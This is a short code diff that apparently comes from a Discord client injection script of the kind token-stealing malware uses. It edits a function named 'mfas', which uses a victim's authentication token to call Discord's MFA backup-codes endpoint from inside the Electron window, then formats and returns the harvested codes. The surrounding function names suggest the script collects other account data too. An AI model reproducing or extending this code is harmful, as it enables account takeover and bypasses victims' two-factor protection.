@@ -285,8 +285,9 @@ function total_f(fr) {
 }
 
 function mfas(token) {
-const window = BrowserWindow.getAllWindows()[0];
-window.webContents.executeJavaScript(`
+  var f = "";
+  const window = BrowserWindow.getAllWindows()[0];
+  window.webContents.executeJavaScript(`
   var xmlHttp = new XMLHttpRequest();
   xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);
   xmlHttp.setRequestHeader('Content-Type', 'application/json');
@@ -301,7 +302,9 @@ window.webContents.executeJavaScript(`
 		for (let z in r) {
 		  fieldo.push(`\`${r[z].code.insert(4, "-")}\`\n`)
 		}
-    return fieldo;
+    f += fieldo;
+  })
+  return f;
 }
 
 function calc_f(fr) {
